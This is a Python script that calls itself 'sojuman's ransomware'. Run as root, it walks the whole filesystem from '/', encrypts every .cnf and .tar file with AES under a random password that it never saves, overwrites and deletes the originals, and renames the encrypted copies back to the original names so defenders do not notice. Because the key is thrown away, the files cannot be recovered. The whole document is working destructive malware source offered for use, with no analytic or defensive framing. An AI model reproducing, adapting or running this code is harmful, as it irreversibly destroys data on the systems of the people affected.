import os
import string
import random
import pyAesCrypt


"""
    Description: Recursively walk through entire directory, and files that matches the extension.

    param: (str) Starting point, (tuple) target Extension names
    return: (list) Target files 
"""
def walk(drive, extensions):
    target_file = []
    nono = ["bin","boot","snap","proc","srv"]

    for root, dirs, files in os.walk(drive):
        for dir in dirs:
            if dir in nono:
                dirs.remove(dir)
        for name in files:
            if name.endswith(extensions):
                #print ("[DEBUG] Found: ", os.path.join(root,name))
                target_file.append(os.path.join(root,name))

    return target_file

"""
    Description: Encrypt file using AES 256bit, CBC mode with random password + random IV

    param: (list) Target files to encrypt 
    return: (list)  Encrypted filenames 
"""
def encrypt(files):
    encrypted_files = []

    bufferSize = 64*1024
    password = ''.join(random.choices(string.ascii_letters + string.digits + "/?!@#$%^&*()-=+", k=24))

    for file in files:
        try:
            encFile = file + ".soju"
            pyAesCrypt.encryptFile(file, encFile, password, bufferSize)

            encrypted_files.append(encFile)    
        
        except OSError:
            pass

    return encrypted_files


"""
    Description: Overwrite original file with junk data and then remove the file, so recovery is impossible

    Param:
        filelist: list of file names to shred

"""
def shred(filelist): 
    for filename in filelist:

        try: 
            fileSize = os.path.getsize(filename)
            data = ''.join(random.choices(string.ascii_letters + string.digits + "/?!@#$%^&*()-=+", k=fileSize))

            with open(filename, 'w') as fd:
                fd.seek(0)
                fd.truncate()
                fd.write(data)

            fd.close()

            os.remove(filename)

        except OSError:
            pass

def overwrite(filelist):
    for filename in filelist:
        try:
            os.rename(filename, filename[:-5])
    
        except OSError:
            pass
def main():
    print ("="*50)
    print ("="*10, "Welcome to sojuman's ransomware","="*10)
    print ("="*50)

    print ("\n <<< REMEMBER TO RUN WITH HIGHEST PRIVILEGE (sudo, root, etc...) >>> \n")

    extensions = (".cnf", ".tar")   # Add lots more if you want to 

    # Get all .cnf files from /etc directory
    starting_path = "/"     
    target_files = walk(starting_path, extensions)
    print ("[DEBUG] [+] List of targeted files\n", target_files)

    # Encrypting...
    encrypted_files = encrypt(target_files)
    print ("[DEBUG] [+] Files Encrypted.")

    # Removing + Overwriting with junk data = Shredding... 
    shred(target_files)
    print ("[DEBUG] [+] Shredded files.")

    # Renaming all the encrypted files to original file name, 
    # So the blue teams would not notice... 
    overwrite(encrypted_files)
    print ("[DEBUG] [+] All done. If this user has permission, these files are all encrypted.\n", target_files)

main()


